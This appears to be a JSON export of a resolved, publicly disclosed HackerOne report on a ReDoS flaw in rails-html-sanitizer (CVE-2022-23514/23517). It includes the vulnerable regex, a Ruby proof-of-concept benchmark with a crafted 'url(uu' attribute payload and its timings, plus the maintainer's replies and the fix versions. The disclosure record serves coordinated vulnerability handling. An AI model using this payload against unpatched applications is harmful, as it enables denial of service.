@@ -1,0 +1,342 @@
+{
+  "id": 1684163,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjg0MTYz",
+  "url": "https://hackerone.com/reports/1684163",
+  "title": "ReDoS (Rails::Html::PermitScrubber.scrub_attribute)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-30T02:48:16.070Z",
+  "submitted_at": "2022-08-30T02:48:16.082Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-23514",
+    "CVE-2022-23517"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-01-02T13:22:09.017Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-01-02T11:46:17.369Z",
+  "team_member_agreed_on_going_public_at": "2023-01-02T13:22:08.868Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have confirmed that ReDoS occurs on `Rails::Html::PermitScrubber.scrub_attribute`.\n\nhttps://github.com/rails/rails-html-sanitizer/blob/v1.4.3/lib/rails/html/scrubbers.rb#L134\n\n```ruby\n      def scrub_attribute(node, attr_node)\n        attr_name = if attr_node.namespace\n                      \"#{attr_node.namespace.prefix}:#{attr_node.node_name}\"\n                    else\n                      attr_node.node_name\n                    end\n\n        ...\n        if Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF.include?(attr_name)\n          attr_node.value = attr_node.value.gsub(/url\\s*\\(\\s*[^#\\s][^)]+?\\)/m, ' ') if attr_node.value\n        end\n```        \n\n`/url\\s*\\(\\s*[^#\\s][^)]+?\\)/m` is where the problem occurs. \n\n---\n\n### PoC\n\n```ruby\n# Gemfile\ngem 'rails-html-sanitizer', '~> 1.4', '>= 1.4.3'\n```\n\nscrub_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rails-html-sanitizer'\n\ndef scrub(length)\n  scrubber = Rails::Html::PermitScrubber.new\n  scrubber.tags = ['s']\n  scrubber.attributes = ['mask']\n\n  mask =  'url(uu' * length\n\n  html_fragment = Loofah.fragment('<s mask=\"' + mask + '\" id=\"aa\">aa</s>')\n  html_fragment.scrub!(scrubber)\nend\n\nBenchmark.bm do |x|\n  x.report { scrub(10) }\n  x.report { scrub(100) }\n  x.report { scrub(1000) }\n  x.report { scrub(10000) }\n  x.report { scrub(100000) }\nend\n```\n\n```\n❯ bundle exec ruby scrub_benchmark.rb\n       user     system      total        real\n   0.000208   0.000020   0.000228 (  0.000226)\n   0.000316   0.000001   0.000317 (  0.000320)\n   0.023582   0.000039   0.023621 (  0.023653)\n   2.430801   0.007312   2.438113 (  2.446419)\n 233.864668   0.498743 234.363411 (234.632421)\n```\n\n## Impact\n\nReDoS may occur if scrub is executed in Rails::Html::PermitScrubber.\n\nHowever, one of the values [Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF](https://github.com/flavorjones/loofah/blob/v2.18.0/lib/loofah/html5/safelist.rb#L583) must be set in `attributes`.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2023-02-01T11:46:17.435Z",
+  "allow_singular_disclosure_after": -20200306.968831588,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "jumpydata",
+    "zy9ard3",
+    "shubham_srt",
+    "khizer47",
+    "shivammusic",
+    "alysia",
+    "anonymous_26",
+    "mehrin",
+    "c1mask",
+    "meispi",
+    "and 1 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 18183391,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for reporting this, I'll take a look.",
+      "automated_response": false,
+      "created_at": "2022-08-30T12:31:36.962Z",
+      "updated_at": "2022-08-30T12:31:36.962Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 18869512,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks for your patience. I've reproduced this redos and acknowledge it's a vulnerability. I'll generate a CVE and work towards a security release in which this will be fixed.",
+      "automated_response": false,
+      "created_at": "2022-10-19T19:43:54.296Z",
+      "updated_at": "2022-10-19T19:43:54.296Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19515151,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I'm close to making a release for this issue. Please note that I'll be generating CVEs for both Rails::Html::Sanitizer and for Loofah which also is susceptible to this same regular expression due to code duplication, and I'll credit you in both.",
+      "automated_response": false,
+      "created_at": "2022-12-10T21:47:31.877Z",
+      "updated_at": "2022-12-10T21:47:31.877Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19549332,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-12-13T13:58:31.315Z",
+      "updated_at": "2022-12-13T13:58:31.315Z",
+      "cve_ids": [
+        "CVE-2022-23514",
+        "CVE-2022-23517"
+      ],
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19549339,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "rails-html-sanitizer v1.4.4 and loofah v2.19.1 address this. See https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-5x79-w82f-gw8w and https://github.com/flavorjones/loofah/security/advisories/GHSA-486f-hjj9-9vhh",
+      "automated_response": false,
+      "created_at": "2022-12-13T13:59:23.764Z",
+      "updated_at": "2022-12-13T13:59:23.764Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19760140,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "I confirmed the fix. And i received a bounty from IBB. https://hackerone.com/reports/1804128",
+      "automated_response": false,
+      "created_at": "2023-01-02T11:46:17.398Z",
+      "updated_at": "2023-01-02T11:46:17.398Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19760657,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-01-02T13:22:08.906Z",
+      "updated_at": "2023-01-02T13:22:08.906Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 19760658,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-01-02T13:22:09.065Z",
+      "updated_at": "2023-01-02T13:22:09.065Z",
+      "actor": {
+        "username": "flavorjones",
+        "cleared": false,
+        "verified": false,
+        "url": "/flavorjones",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22547937,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "Already paid by IBB",
+      "automated_response": false,
+      "created_at": "2023-06-28T00:19:11.249Z",
+      "updated_at": "2023-06-28T00:19:11.249Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
